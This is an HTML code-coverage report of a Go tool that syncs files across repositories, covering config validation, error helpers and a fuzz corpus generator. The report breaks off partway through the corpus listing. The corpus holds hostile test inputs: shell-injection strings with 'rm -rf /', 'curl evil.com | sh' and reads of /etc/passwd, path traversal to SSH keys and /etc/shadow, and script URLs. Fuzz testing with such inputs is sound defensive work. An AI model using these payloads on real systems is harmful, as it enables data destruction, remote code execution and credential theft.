                        logging.StandardFields.BranchName: group.Source.Branch,
                        "group_name":                      group.Name,
                        "group_id":                        group.ID,
                }).Trace("Validating group source repository configuration")
        }</span>

        // Check for context cancellation
        <span class="cov8" title="1">select </span>{
        case &lt;-ctx.Done():<span class="cov0" title="0">
                return fmt.Errorf("group source validation canceled: %w", ctx.Err())</span>
        default:<span class="cov8" title="1"></span>
        }

        // Use centralized validation for source configuration
        <span class="cov8" title="1">if err := validation.ValidateSourceConfig(group.Source.Repo, group.Source.Branch); err != nil </span><span class="cov8" title="1">{
                if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                        logger.WithFields(logrus.Fields{
                                logging.StandardFields.RepoName:   group.Source.Repo,
                                logging.StandardFields.BranchName: group.Source.Branch,
                                logging.StandardFields.ErrorType:  "validation_failed",
                                "group_name":                      group.Name,
                                "group_id":                        group.ID,
                        }).Error("Group source configuration validation failed")
                }</span>
                <span class="cov8" title="1">return err</span>
        }

        <span class="cov8" title="1">if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                logger.Debug("Group source configuration validation completed successfully")
        }</span>

        <span class="cov8" title="1">return nil</span>
}

// validateGroupGlobalWithLogging validates group global configuration with debug logging support.
func (c *Config) validateGroupGlobalWithLogging(ctx context.Context, logConfig *logging.LogConfig, group Group) error <span class="cov8" title="1">{
        logger := logrus.WithField("component", "config-group-global")

        if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                logger.WithFields(logrus.Fields{
                        "pr_labels":         group.Global.PRLabels,
                        "pr_assignees":      group.Global.PRAssignees,
                        "pr_reviewers":      group.Global.PRReviewers,
                        "pr_team_reviewers": group.Global.PRTeamReviewers,
                        "group_name":        group.Name,
                        "group_id":          group.ID,
                }).Trace("Validating group global configuration")
        }</span>

        // Check for context cancellation
        <span class="cov8" title="1">select </span>{
        case &lt;-ctx.Done():<span class="cov0" title="0">
                return fmt.Errorf("group global validation canceled: %w", ctx.Err())</span>
        default:<span class="cov8" title="1"></span>
        }

        // Validate PR labels
        <span class="cov8" title="1">for i, label := range group.Global.PRLabels </span><span class="cov8" title="1">{
                if err := validation.ValidateNonEmpty("group global PR label", label); err != nil </span><span class="cov0" title="0">{
                        if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                                logger.WithField("label_index", i).Error("Empty group global PR label found")
                        }</span>
                        <span class="cov0" title="0">return err</span>
                }
        }

        // Validate PR assignees, reviewers, team reviewers
        <span class="cov8" title="1">for i, assignee := range group.Global.PRAssignees </span><span class="cov8" title="1">{
                if err := validation.ValidateNonEmpty("group global PR assignee", assignee); err != nil </span><span class="cov0" title="0">{
                        if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                                logger.WithField("assignee_index", i).Error("Empty group global PR assignee found")
                        }</span>
                        <span class="cov0" title="0">return err</span>
                }
        }

        <span class="cov8" title="1">for i, reviewer := range group.Global.PRReviewers </span><span class="cov8" title="1">{
                if err := validation.ValidateNonEmpty("group global PR reviewer", reviewer); err != nil </span><span class="cov0" title="0">{
                        if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                                logger.WithField("reviewer_index", i).Error("Empty group global PR reviewer found")
                        }</span>
                        <span class="cov0" title="0">return err</span>
                }
        }

        <span class="cov8" title="1">for i, teamReviewer := range group.Global.PRTeamReviewers </span><span class="cov8" title="1">{
                if err := validation.ValidateNonEmpty("group global PR team reviewer", teamReviewer); err != nil </span><span class="cov0" title="0">{
                        if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                                logger.WithField("team_reviewer_index", i).Error("Empty group global PR team reviewer found")
                        }</span>
                        <span class="cov0" title="0">return err</span>
                }
        }

        <span class="cov8" title="1">if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                logger.Debug("Group global configuration validation completed successfully")
        }</span>

        <span class="cov8" title="1">return nil</span>
}

// validateGroupDefaultsWithLogging validates group defaults configuration with debug logging support.
func (c *Config) validateGroupDefaultsWithLogging(ctx context.Context, logConfig *logging.LogConfig, group Group) error <span class="cov8" title="1">{
        logger := logrus.WithField("component", "config-group-defaults")

        if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                logger.WithFields(logrus.Fields{
                        "branch_prefix": group.Defaults.BranchPrefix,
                        "pr_labels":     group.Defaults.PRLabels,
                        "group_name":    group.Name,
                        "group_id":      group.ID,
                }).Trace("Validating group defaults configuration")
        }</span>

        // Check for context cancellation
        <span class="cov8" title="1">select </span>{
        case &lt;-ctx.Done():<span class="cov0" title="0">
                return fmt.Errorf("group defaults validation canceled: %w", ctx.Err())</span>
        default:<span class="cov8" title="1"></span>
        }

        // Validate branch prefix using centralized validation
        <span class="cov8" title="1">if err := validation.ValidateBranchPrefix(group.Defaults.BranchPrefix); err != nil </span><span class="cov8" title="1">{
                if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                        logger.WithField("branch_prefix", group.Defaults.BranchPrefix).Error("Invalid group branch prefix format")
                }</span>
                <span class="cov8" title="1">return err</span>
        }

        // Validate PR labels
        <span class="cov8" title="1">for i, label := range group.Defaults.PRLabels </span><span class="cov8" title="1">{
                if err := validation.ValidateNonEmpty("group PR label", label); err != nil </span><span class="cov8" title="1">{
                        if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                                logger.WithField("label_index", i).Error("Empty group PR label found")
                        }</span>
                        <span class="cov8" title="1">return err</span>
                }
        }

        <span class="cov8" title="1">if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                logger.Debug("Group defaults configuration validation completed successfully")
        }</span>

        <span class="cov8" title="1">return nil</span>
}

// validateWithLogging validates a target configuration with debug logging support.
//
// Parameters:
// - ctx: Context for cancellation control
// - logConfig: Configuration for debug logging
// - logger: Logger entry for output
//
// Returns:
// - Error if target configuration is invalid
//
// Side Effects:
// - Logs detailed target validation when --debug-config flag is enabled
func (t *TargetConfig) validateWithLogging(ctx context.Context, logConfig *logging.LogConfig, logger *logrus.Entry) error <span class="cov8" title="1">{
        if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                logger.WithFields(logrus.Fields{
                        "repo":                    t.Repo,
                        "file_count":              len(t.Files),
                        "has_transform_repo_name": t.Transform.RepoName,
                        "has_transform_variables": len(t.Transform.Variables) &gt; 0,
                }).Trace("Validating target repository configuration")
        }</span>

        // Check for context cancellation
        <span class="cov8" title="1">select </span>{
        case &lt;-ctx.Done():<span class="cov0" title="0">
                return fmt.Errorf("target validation canceled: %w", ctx.Err())</span>
        default:<span class="cov8" title="1"></span>
        }

        // Validate that we have at least one file or directory mapping
        <span class="cov8" title="1">if len(t.Files) == 0 &amp;&amp; len(t.Directories) == 0 </span><span class="cov8" title="1">{
                return ErrNoMappings
        }</span>

        // Convert file mappings to validation format
        <span class="cov8" title="1">fileMappings := make([]validation.FileMapping, 0, len(t.Files))
        for _, file := range t.Files </span><span class="cov8" title="1">{
                fileMappings = append(fileMappings, validation.FileMapping{
                        Src:  file.Src,
                        Dest: file.Dest,
                })
        }</span>

        // Use centralized validation for target configuration only if we have files
        <span class="cov8" title="1">if len(fileMappings) &gt; 0 </span><span class="cov8" title="1">{
                if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                        logger.WithField("repo_format", t.Repo).Trace("Validating target repository configuration")
                }</span>

                <span class="cov8" title="1">if err := validation.ValidateTargetConfig(t.Repo, fileMappings); err != nil </span><span class="cov8" title="1">{
                        if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                                logger.WithFields(logrus.Fields{
                                        "repo":       t.Repo,
                                        "file_count": len(t.Files),
                                }).Error("Target repository validation failed")
                        }</span>
                        <span class="cov8" title="1">return err</span>
                }
        } else<span class="cov0" title="0"> {
                // Validate repo name when we only have directories
                if err := validation.ValidateRepoName(t.Repo); err != nil </span><span class="cov0" title="0">{
                        return err
                }</span>
        }

        <span class="cov8" title="1">if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                logger.WithField("file_count", len(t.Files)).Debug("File mappings validated via centralized validation")
        }</span>

        // Log transform configuration if present
        <span class="cov8" title="1">if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                if t.Transform.RepoName || len(t.Transform.Variables) &gt; 0 </span><span class="cov0" title="0">{
                        logger.WithFields(logrus.Fields{
                                "repo_name_transform": t.Transform.RepoName,
                                "variable_count":      len(t.Transform.Variables),
                        }).Debug("Transform configuration detected")

                        if len(t.Transform.Variables) &gt; 0 </span><span class="cov0" title="0">{
                                for key, value := range t.Transform.Variables </span><span class="cov0" title="0">{
                                        logger.WithFields(logrus.Fields{
                                                "variable": key,
                                                "value":    value,
                                        }).Trace("Transform variable")
                                }</span>
                        }
                }
        }

        // Validate PR labels for this target
        <span class="cov8" title="1">if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                logger.WithField("label_count", len(t.PRLabels)).Trace("Validating target-specific PR labels")
        }</span>

        <span class="cov8" title="1">for i, label := range t.PRLabels </span><span class="cov8" title="1">{
                if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                        logger.WithFields(logrus.Fields{
                                "label_index": i,
                                "label":       label,
                        }).Trace("Validating target PR label")
                }</span>

                <span class="cov8" title="1">if err := validation.ValidateNonEmpty("target PR label", label); err != nil </span><span class="cov8" title="1">{
                        if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                                logger.WithField("label_index", i).Error("Empty target PR label found")
                        }</span>
                        <span class="cov8" title="1">return err</span>
                }
        }

        // Validate directories if present
        <span class="cov8" title="1">if len(t.Directories) &gt; 0 </span><span class="cov0" title="0">{
                if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                        logger.WithField("directory_count", len(t.Directories)).Debug("Validating directory mappings")
                }</span>

                <span class="cov0" title="0">if err := t.validateDirectories(ctx, logger); err != nil </span><span class="cov0" title="0">{
                        return fmt.Errorf("invalid directory configuration: %w", err)
                }</span>
        }

        <span class="cov8" title="1">if logConfig != nil &amp;&amp; logConfig.Debug.Config </span><span class="cov0" title="0">{
                logger.Debug("Target configuration validation completed successfully")
        }</span>

        <span class="cov8" title="1">return nil</span>
}

// validateDirectories validates directory mappings
func (t *TargetConfig) validateDirectories(_ context.Context, _ *logrus.Entry) error <span class="cov8" title="1">{
        // Check for empty directories
        for i, dir := range t.Directories </span><span class="cov8" title="1">{
                if dir.Src == "" </span><span class="cov8" title="1">{
                        return fmt.Errorf("directory[%d]: %w", i, ErrEmptySourcePath)
                }</span>
                <span class="cov8" title="1">if dir.Dest == "" </span><span class="cov8" title="1">{
                        return fmt.Errorf("directory[%d]: %w", i, ErrEmptyDestPath)
                }</span>

                // Validate paths don't contain path traversal
                <span class="cov8" title="1">if strings.Contains(dir.Src, "..") || strings.Contains(dir.Dest, "..") </span><span class="cov8" title="1">{
                        return fmt.Errorf("directory[%d]: %w", i, ErrPathTraversal)
                }</span>

                // Validate exclusion patterns
                <span class="cov8" title="1">for _, pattern := range dir.Exclude </span><span class="cov8" title="1">{
                        if _, err := filepath.Match(pattern, "test"); err != nil </span><span class="cov8" title="1">{
                                return fmt.Errorf("directory[%d]: invalid exclusion pattern %q: %w", i, pattern, err)
                        }</span>
                }
        }

        // Check for conflicts between files and directories
        <span class="cov8" title="1">return t.validateFileDirectoryConflicts()</span>
}

// validateFileDirectoryConflicts ensures no conflicts between file and directory mappings
func (t *TargetConfig) validateFileDirectoryConflicts() error <span class="cov8" title="1">{
        // Build map of all destination paths
        destPaths := make(map[string]string)

        // Add file destinations
        for _, file := range t.Files </span><span class="cov8" title="1">{
                destPaths[file.Dest] = "file"
        }</span>

        // Check directory destinations don't conflict
        <span class="cov8" title="1">for _, dir := range t.Directories </span><span class="cov8" title="1">{
                if existing, exists := destPaths[dir.Dest]; exists </span><span class="cov8" title="1">{
                        return fmt.Errorf("destination path %q used by both %s and directory: %w", dir.Dest, existing, ErrDuplicateDestPath)
                }</span>
                <span class="cov8" title="1">destPaths[dir.Dest] = "directory"</span>
        }

        <span class="cov8" title="1">return nil</span>
}
</pre>

		<pre class="file" id="file23" style="display: none">// Package errors - API operation error utilities
package errors

import (
        "errors"
        "fmt"
)

// Error templates for API operations
var (
        errGitOperationTemplate   = errors.New("git operation failed")
        errGitHubAPITemplate      = errors.New("GitHub API operation failed")
        errAPIResponseTemplate    = errors.New("API response error")
        errRateLimitTemplate      = errors.New("rate limit exceeded")
        errAuthenticationTemplate = errors.New("authentication failed")
)

// GitOperationError creates a standardized git command error.
// This consolidates patterns like fmt.Errorf("git %s failed: %w", operation, err).
//
// Example usage:
//
//        return GitOperationError("clone", "user/repo", err)
//        // Returns: "git operation failed: clone 'user/repo': &lt;original error&gt;"
func GitOperationError(operation, context string, err error) error <span class="cov8" title="1">{
        if err == nil </span><span class="cov8" title="1">{
                return nil
        }</span>
        <span class="cov8" title="1">return fmt.Errorf("%w: %s '%s': %w", errGitOperationTemplate, operation, context, err)</span>
}

// GitCloneError is a convenience function for git clone errors.
func GitCloneError(repo string, err error) error <span class="cov8" title="1">{
        return GitOperationError("clone", repo, err)
}</span>

// GitCheckoutError is a convenience function for git checkout errors.
func GitCheckoutError(branch string, err error) error <span class="cov8" title="1">{
        return GitOperationError("checkout", branch, err)
}</span>

// GitAddError is a convenience function for git add errors.
func GitAddError(files string, err error) error <span class="cov8" title="1">{
        return GitOperationError("add", files, err)
}</span>

// GitCommitError is a convenience function for git commit errors.
func GitCommitError(message string, err error) error <span class="cov8" title="1">{
        return GitOperationError("commit", message, err)
}</span>

// GitPushError is a convenience function for git push errors.
func GitPushError(branch string, err error) error <span class="cov8" title="1">{
        return GitOperationError("push", branch, err)
}</span>

// GitHubAPIError creates a standardized GitHub API error.
// This consolidates patterns like fmt.Errorf("GitHub API %s failed: %w", operation, err).
//
// Example usage:
//
//        return GitHubAPIError("create pull request", "user/repo", err)
//        // Returns: "GitHub API operation failed: create pull request 'user/repo': &lt;original error&gt;"
func GitHubAPIError(operation, context string, err error) error <span class="cov8" title="1">{
        if err == nil </span><span class="cov8" title="1">{
                return nil
        }</span>
        <span class="cov8" title="1">return fmt.Errorf("%w: %s '%s': %w", errGitHubAPITemplate, operation, context, err)</span>
}

// GitHubListError is a convenience function for GitHub list operations.
func GitHubListError(resource, context string, err error) error <span class="cov8" title="1">{
        return GitHubAPIError("list "+resource, context, err)
}</span>

// GitHubGetError is a convenience function for GitHub get operations.
func GitHubGetError(resource, context string, err error) error <span class="cov8" title="1">{
        return GitHubAPIError("get "+resource, context, err)
}</span>

// GitHubCreateError is a convenience function for GitHub create operations.
func GitHubCreateError(resource, context string, err error) error <span class="cov8" title="1">{
        return GitHubAPIError("create "+resource, context, err)
}</span>

// GitHubUpdateError is a convenience function for GitHub update operations.
func GitHubUpdateError(resource, context string, err error) error <span class="cov8" title="1">{
        return GitHubAPIError("update "+resource, context, err)
}</span>

// APIResponseError creates a standardized API response error.
// This is for unexpected API responses or status codes.
//
// Example usage:
//
//        return APIResponseError(404, "repository not found")
//        // Returns: "API response error: status 404: repository not found"
func APIResponseError(statusCode int, message string) error <span class="cov8" title="1">{
        return fmt.Errorf("%w: status %d: %s", errAPIResponseTemplate, statusCode, message)
}</span>

// RateLimitError creates a standardized rate limit error.
// This provides consistent rate limit error messages.
//
// Example usage:
//
//        return RateLimitError("GitHub API", resetTime)
//        // Returns: "rate limit exceeded: GitHub API: resets at &lt;time&gt;"
func RateLimitError(service, resetTime string) error <span class="cov8" title="1">{
        return fmt.Errorf("%w: %s: resets at %s", errRateLimitTemplate, service, resetTime)
}</span>

// AuthenticationError creates a standardized authentication error.
// This provides consistent authentication error messages.
//
// Example usage:
//
//        return AuthenticationError("GitHub", "invalid token")
//        // Returns: "authentication failed: GitHub: invalid token"
func AuthenticationError(service, reason string) error <span class="cov8" title="1">{
        return fmt.Errorf("%w: %s: %s", errAuthenticationTemplate, service, reason)
}</span>
</pre>

		<pre class="file" id="file24" style="display: none">// Package errors defines common error types and utilities used throughout the application
package errors

import (
        "errors"
        "fmt"
)

// Common errors used across the application
var (
        // Sync errors
        ErrNoFilesToCommit   = errors.New("no files to commit")
        ErrNoTargets         = errors.New("no targets configured")
        ErrInvalidConfig     = errors.New("invalid configuration")
        ErrSyncFailed        = errors.New("sync operation failed")
        ErrNoMatchingTargets = errors.New("no targets match the specified filter")
        ErrFileNotFound      = errors.New("source file not found")
        ErrTransformNotFound = errors.New("transform not found")

        // State errors
        ErrPRExists       = errors.New("pull request already exists")
        ErrPRNotFound     = errors.New("pull request not found")
        ErrBranchNotFound = errors.New("branch not found")

        // Git errors
        ErrInvalidRepoPath = errors.New("invalid repository path")
        ErrGitCommand      = errors.New("git command failed")

        // Test errors (only used in tests)
        ErrTest = errors.New("test error")
)

// Error templates for static error definitions (satisfies err113 linter)
var (
        errInvalidFieldTemplate     = errors.New("invalid field")
        errCommandFailedTemplate    = errors.New("command failed")
        errValidationFailedTemplate = errors.New("validation failed")
        errPathTraversalTemplate    = errors.New("path traversal detected")
        errEmptyFieldTemplate       = errors.New("field cannot be empty")
        errRequiredFieldTemplate    = errors.New("field is required")
        errInvalidFormatTemplate    = errors.New("invalid format")
)

// Error utility functions for standardized error creation and context wrapping

// WrapWithContext wraps an error with operation context using consistent formatting.
// This replaces manual fmt.Errorf("failed to %s: %w", operation, err) patterns.
func WrapWithContext(err error, operation string) error <span class="cov8" title="1">{
        if err == nil </span><span class="cov8" title="1">{
                return nil
        }</span>
        <span class="cov8" title="1">return fmt.Errorf("failed to %s: %w", operation, err)</span>
}

// InvalidFieldError creates a standardized invalid field error.
// This replaces manual fmt.Errorf("invalid %s: %s", field, value) patterns.
func InvalidFieldError(field, value string) error <span class="cov8" title="1">{
        return fmt.Errorf("%w: %s: %s", errInvalidFieldTemplate, field, value)
}</span>

// CommandFailedError creates a standardized command failure error.
// This standardizes command execution error reporting across git, gh, and other packages.
func CommandFailedError(cmd string, err error) error <span class="cov8" title="1">{
        if err == nil </span><span class="cov8" title="1">{
                return nil
        }</span>
        <span class="cov8" title="1">return fmt.Errorf("%w: '%s': %w", errCommandFailedTemplate, cmd, err)</span>
}

// ValidationError creates a standardized validation error.
// This provides consistent validation error messages across all validation functions.
func ValidationError(item, reason string) error <span class="cov8" title="1">{
        return fmt.Errorf("%w for %s: %s", errValidationFailedTemplate, item, reason)
}</span>

// PathTraversalError creates a specific error for path traversal attempts.
// This standardizes security-related path validation errors.
func PathTraversalError(path string) error <span class="cov8" title="1">{
        return fmt.Errorf("%w: invalid path '%s'", errPathTraversalTemplate, path)
}</span>

// EmptyFieldError creates a standardized empty field validation error.
// This replaces various "field cannot be empty" error patterns.
func EmptyFieldError(field string) error <span class="cov8" title="1">{
        return fmt.Errorf("%w: %s", errEmptyFieldTemplate, field)
}</span>

// RequiredFieldError creates a standardized required field error.
// This provides consistent messaging for missing required fields.
func RequiredFieldError(field string) error <span class="cov8" title="1">{
        return fmt.Errorf("%w: %s", errRequiredFieldTemplate, field)
}</span>

// FormatError creates a standardized format validation error.
// This provides consistent messaging for format validation failures.
func FormatError(field, value, expectedFormat string) error <span class="cov8" title="1">{
        return fmt.Errorf("%w: %s '%s': expected %s", errInvalidFormatTemplate, field, value, expectedFormat)
}</span>
</pre>

		<pre class="file" id="file25" style="display: none">// Package errors - file operation error utilities
package errors

import (
        "errors"
        "fmt"
)

// Error templates for file operations
var (
        errFileOperationTemplate      = errors.New("file operation failed")
        errDirectoryOperationTemplate = errors.New("directory operation failed")
        errJSONOperationTemplate      = errors.New("JSON operation failed")
        errBatchOperationTemplate     = errors.New("batch operation failed")
)

// FileOperationError creates a standardized file operation error.
// This consolidates patterns like fmt.Errorf("failed to %s file %s: %w", operation, path, err).
//
// Example usage:
//
//        return FileOperationError("read", "/path/to/file.txt", err)
//        // Returns: "file operation failed: read '/path/to/file.txt': &lt;original error&gt;"
func FileOperationError(operation, path string, err error) error <span class="cov8" title="1">{
        if err == nil </span><span class="cov8" title="1">{
                return nil
        }</span>
        <span class="cov8" title="1">return fmt.Errorf("%w: %s '%s': %w", errFileOperationTemplate, operation, path, err)</span>
}

// DirectoryOperationError creates a standardized directory operation error.
// This consolidates patterns like fmt.Errorf("failed to %s directory %s: %w", operation, path, err).
//
// Example usage:
//
//        return DirectoryOperationError("create", "/path/to/dir", err)
//        // Returns: "directory operation failed: create '/path/to/dir': &lt;original error&gt;"
func DirectoryOperationError(operation, path string, err error) error <span class="cov8" title="1">{
        if err == nil </span><span class="cov8" title="1">{
                return nil
        }</span>
        <span class="cov8" title="1">return fmt.Errorf("%w: %s '%s': %w", errDirectoryOperationTemplate, operation, path, err)</span>
}

// FileReadError is a convenience function for file read operations.
// This replaces fmt.Errorf("failed to read file %s: %w", path, err).
func FileReadError(path string, err error) error <span class="cov8" title="1">{
        return FileOperationError("read", path, err)
}</span>

// FileWriteError is a convenience function for file write operations.
// This replaces fmt.Errorf("failed to write file %s: %w", path, err).
func FileWriteError(path string, err error) error <span class="cov8" title="1">{
        return FileOperationError("write", path, err)
}</span>

// FileOpenError is a convenience function for file open operations.
// This replaces fmt.Errorf("failed to open file %s: %w", path, err).
func FileOpenError(path string, err error) error <span class="cov8" title="1">{
        return FileOperationError("open", path, err)
}</span>

// FileCreateError is a convenience function for file creation operations.
// This replaces fmt.Errorf("failed to create file %s: %w", path, err).
func FileCreateError(path string, err error) error <span class="cov8" title="1">{
        return FileOperationError("create", path, err)
}</span>

// FileDeleteError is a convenience function for file deletion operations.
// This replaces fmt.Errorf("failed to delete file %s: %w", path, err).
func FileDeleteError(path string, err error) error <span class="cov8" title="1">{
        return FileOperationError("delete", path, err)
}</span>

// DirectoryCreateError is a convenience function for directory creation.
// This replaces fmt.Errorf("failed to create directory %s: %w", path, err).
func DirectoryCreateError(path string, err error) error <span class="cov8" title="1">{
        return DirectoryOperationError("create", path, err)
}</span>

// DirectoryWalkError is a convenience function for directory walking errors.
// This replaces fmt.Errorf("failed to walk directory %s: %w", path, err).
func DirectoryWalkError(path string, err error) error <span class="cov8" title="1">{
        return DirectoryOperationError("walk", path, err)
}</span>

// JSONOperationError creates a standardized JSON processing error.
// This consolidates patterns like fmt.Errorf("failed to %s JSON: %w", operation, err).
//
// Example usage:
//
//        return JSONOperationError("marshal", "user data", err)
//        // Returns: "JSON operation failed: marshal 'user data': &lt;original error&gt;"
func JSONOperationError(operation, context string, err error) error <span class="cov8" title="1">{
        if err == nil </span><span class="cov8" title="1">{
                return nil
        }</span>
        <span class="cov8" title="1">return fmt.Errorf("%w: %s '%s': %w", errJSONOperationTemplate, operation, context, err)</span>
}

// JSONMarshalError is a convenience function for JSON marshal errors.
// This replaces fmt.Errorf("failed to marshal %s: %w", context, err).
func JSONMarshalError(context string, err error) error <span class="cov8" title="1">{
        return JSONOperationError("marshal", context, err)
}</span>

// JSONUnmarshalError is a convenience function for JSON unmarshal errors.
// This replaces fmt.Errorf("failed to unmarshal %s: %w", context, err).
func JSONUnmarshalError(context string, err error) error <span class="cov8" title="1">{
        return JSONOperationError("unmarshal", context, err)
}</span>

// BatchOperationError creates a standardized batch operation error.
// This consolidates patterns for batch processing failures.
//
// Example usage:
//
//        return BatchOperationError("process", 0, 10, err)
//        // Returns: "batch operation failed: process items 0-9: &lt;original error&gt;"
func BatchOperationError(operation string, start, end int, err error) error <span class="cov8" title="1">{
        if err == nil </span><span class="cov8" title="1">{
                return nil
        }</span>
        <span class="cov8" title="1">return fmt.Errorf("%w: %s items %d-%d: %w", errBatchOperationTemplate, operation, start, end-1, err)</span>
}
</pre>

		<pre class="file" id="file26" style="display: none">// Package fuzz provides fuzzing utilities and corpus generation
//
//nolint:gosmopolitan // Test data requires unicode characters
package fuzz

import (
        "encoding/json"
        "fmt"
        "os"
        "path/filepath"
        "strings"
)

// CorpusGenerator manages the generation of fuzz test corpus data
type CorpusGenerator struct {
        BaseDir string
}

// NewCorpusGenerator creates a new corpus generator
func NewCorpusGenerator(baseDir string) *CorpusGenerator <span class="cov8" title="1">{
        return &amp;CorpusGenerator{BaseDir: baseDir}
}</span>

// GenerateAll generates corpus for all packages
func (g *CorpusGenerator) GenerateAll() error <span class="cov8" title="1">{
        generators := []func() error{
                g.GenerateConfigCorpus,
                g.GenerateGitCorpus,
                g.GenerateGHCorpus,
                g.GenerateTransformCorpus,
        }

        for _, gen := range generators </span><span class="cov8" title="1">{
                if err := gen(); err != nil </span><span class="cov0" title="0">{
                        return err
                }</span>
        }
        <span class="cov8" title="1">return nil</span>
}

// GenerateConfigCorpus generates test corpus for config package
func (g *CorpusGenerator) GenerateConfigCorpus() error <span class="cov8" title="1">{
        corpus := []string{
                // Valid configs
                `version: 1
source:
  repo: org/repo
  branch: main
targets:
  - repo: target/repo
    files:
      - src: README.md
        dest: README.md`,

                // Edge cases - version
                `version: 999999`,
                `version: -1`,
                `version: "1.0"`,
                `version: 0`,
                `version: 1.5`,

                // Security attempts - command injection
                `source: {repo: "org/repo; rm -rf /"}`,
                `source: {repo: "org/repo &amp;&amp; curl evil.com/script | sh"}`,
                "source: {repo: \"org/repo`whoami`\"}",
                `source: {repo: "org/repo$(cat /etc/passwd)"}`,
                `source: {branch: "main; echo pwned"}`,

                // Security attempts - path traversal
                `source: {repo: "../../etc/passwd"}`,
                `source: {repo: "../../../home/user/.ssh/id_rsa"}`,
                `targets: [{repo: "org/repo", files: [{src: "../../../etc/passwd", dest: "README.md"}]}]`,
                `targets: [{repo: "org/repo", files: [{src: "README.md", dest: "/etc/passwd"}]}]`,

                // Unicode and special chars
                `source: {repo: "üéâ/üéâ"}`,
                `source: {repo: "org/repo` + "\x00" + `"}`,
                `source: {repo: "–æ—Ä–≥/—Ä–µ–ø–æ"}`,                                    // Cyrillic
                `source: {repo: "ÁªÑÁªá/‰ªìÂ∫ì"}`,                                       // Chinese
                "source: {repo: \"org/repo" + strings.Repeat("a", 1000) + "\"}", // Long name

                // Malformed YAML
                `{{{{{{{{{`,
                `version: 1
source:
  repo: [not, a, string]`,
                `- - - - -`,
                `%YAML 1.2`,

                // Empty and minimal
                ``,
                `version: 1`,
                `{}`,
                `[]`,

                // Deeply nested
                generateDeeplyNested(50),
                generateDeeplyNested(100),

                // Complex valid config
                `version: 1
source:
  repo: org/template
  branch: develop
defaults:
  branch_prefix: sync/update
  pr_labels: ["automated", "sync", "chore"]
targets:
  - repo: org/service-a
    files:
      - src: .github/workflows/ci.yml
        dest: .github/workflows/ci.yml
      - src: Makefile
        dest: Makefile
    transform:
      repo_name: true
      variables:
        SERVICE: service-a
        ENVIRONMENT: production
  - repo: org/service-b
    files:
      - src: docker-compose.yml
        dest: docker-compose.yml
    transform:
      variables:
        PORT: "8080"`,
        }

        return g.saveCorpus("config", corpus)
}</span>

// GenerateGitCorpus generates test corpus for git package
func (g *CorpusGenerator) GenerateGitCorpus() error <span class="cov8" title="1">{
        corpus := []string{
                // Valid URLs
                `https://github.com/org/repo.git`,
                `git@github.com:org/repo.git`,
                `https://gitlab.com/org/repo.git`,
                `ssh://git@github.com/org/repo.git`,
                `https://user:pass@github.com/org/repo.git`,

                // Command injection attempts
                `https://github.com/org/repo.git; rm -rf /`,
                `https://github.com/org/repo.git &amp;&amp; curl evil.com | sh`,
                `https://github.com/org/repo.git$(whoami)`,
                "https://github.com/org/repo.git`id`",
                `git@github.com:org/repo.git; cat /etc/passwd`,

                // Path traversal
                `file:///etc/passwd`,
                `file://../../etc/shadow`,
                `https://github.com/../../../../etc/passwd`,
                `../../../.git/config`,

                // URL injection
                `javascript:alert(1)`,
                `data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;`,
                `vbscript:msgbox(1)`,

                // Special characters
                `https://github.com/org/repo` + "\x00" + `.git`,
                `https://github.com/org/repo\n.git`,
                `https://github.com/org/repo\r\n.git`,
                `https://github.com/org/repo        .git`, // tab

                // Unicode
                `https://github.com/–æ—Ä–≥/—Ä–µ–ø–æ.git`,
                `https://github.com/ÁªÑÁªá/‰ªìÂ∫ì.git`,
                `https://github.com/üéâ/üéâ.git`,

                // Edge cases
                ``,
                `https://`,
                `git@`,
                `:::::`,
                "https://" + strings.Repeat("a", 10000) + ".com/repo.git",

                // File paths for git operations
                `README.md`,
                `src/main.go`,
                `path with spaces/file.txt`,
                `file;rm -rf /.txt`,
                `file|command.txt`,
                `file&gt;.txt`,
                `file&lt;.txt`,
                `file&amp;echo test.txt`,
                `.git/hooks/pre-commit`,
                `../../outside/repo.txt`,
        }

        return g.saveCorpus("git", corpus)
}</span>

// GenerateGHCorpus generates test corpus for GitHub CLI package
func (g *CorpusGenerator) GenerateGHCorpus() error <span class="cov8" title="1">{
        // CLI arguments as JSON arrays
        cliArgs := [][]string{
                // Valid commands
                {"pr", "create", "--title", "Test PR"},
                {"pr", "list", "--limit", "10"},
                {"issue", "create", "--title", "Bug report"},
                {"repo", "clone", "org/repo"},

                // Command injection
                {"pr", "create", "--title", "Test; rm -rf /"},
                {"pr", "create", "--title", "Test`whoami`"},
                {"pr", "create", "--body", "$(cat /etc/passwd)"},
                {"api", "/repos/org/repo", "-f", "name=test;echo injected"},
                {"repo", "clone", "org/repo &amp;&amp; malicious-command"},

                // Path traversal
                {"repo", "clone", "../../etc/passwd"},
                {"api", "/../../../etc/passwd"},

                // Special characters
                {"pr", "create", "--title", "Test\x00"},
                {"pr", "create", "--title", "Test\nNewline"},
